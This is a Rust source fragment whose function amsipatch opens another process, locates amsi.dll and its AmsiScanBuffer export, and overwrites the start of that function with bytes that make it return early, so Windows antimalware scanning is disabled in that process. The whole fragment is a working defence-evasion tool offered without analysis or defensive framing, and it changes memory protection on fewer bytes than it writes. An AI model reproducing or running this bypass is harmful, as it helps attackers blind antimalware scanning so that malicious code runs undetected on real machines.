pub fn amsipatch(pid: usize) -> Result<String,String>{
    unsafe{


        let prochandle = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, 0, pid as u32);
        if prochandle.is_null(){
            return Err(format!("[+] OpenProcess failed: {}",GetLastError()));
        }
        println!("[+] Opened process");
        //println!("[+] Checking if amsi.dll is loaded or not");

        let loadeddlls = getloadeddlls(pid as u32);
        for (k,v) in &loadeddlls{
            if *k == "amsi.dll"{
                println!("[+] amsi.dll found in the {} process at address: {:x?}",pid,*v);
                let res = peparser::parsefrommemory(prochandle, *v as *const c_void);
                if res.is_err(){
                    CloseHandle(prochandle);
                    return Err(format!("{}",res.err().unwrap()));
                }
                let pe = res.unwrap();
                let res = pe.getexports();
                if res.is_err(){
                    CloseHandle(prochandle);
                    return Err(format!("{}",res.err().unwrap()));
                }
                let exports = res.unwrap();
                for (funcname,funcaddress) in &exports{
                    if *funcname=="AmsiScanBuffer"{
                        println!("[+] found AmsiScanBuffer at {:x?}",funcaddress);
                        println!("[+] Trying to patch");
                        
                        let patch:[u8;8] = [0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, 0xC3 ];
                        let mut byteswritten = 0;
                        let mut oldprotect = 0;
                        let res = VirtualProtectEx(prochandle, 
                            (*v as usize + *funcaddress) as *mut c_void, 
                            5, 0x40, &mut oldprotect);
                        if res==0{
                            CloseHandle(prochandle);
                            return Err(format!("[+] changing memory protection failed: {}",GetLastError()));
                        }
                        let res =  WriteProcessMemory(prochandle, 
                                (*v as usize + *funcaddress) as *mut c_void, 
                                patch.as_ptr() as *const c_void, 
                                8, &mut byteswritten);
                        VirtualProtectEx(prochandle, 
                                    (*v as usize + *funcaddress) as *mut c_void, 
                                    5, oldprotect, &mut oldprotect);
                        if res==0{
                            CloseHandle(prochandle);
                            return Err(format!("writeprocessmemory failed: {}",GetLastError()));
                            
                        }
                        CloseHandle(prochandle);
                        return Ok("tried to patch amsi successfully".to_string());

                    }
                }


            }
        }

        return Err(format!("something went wrong"));

    }
}

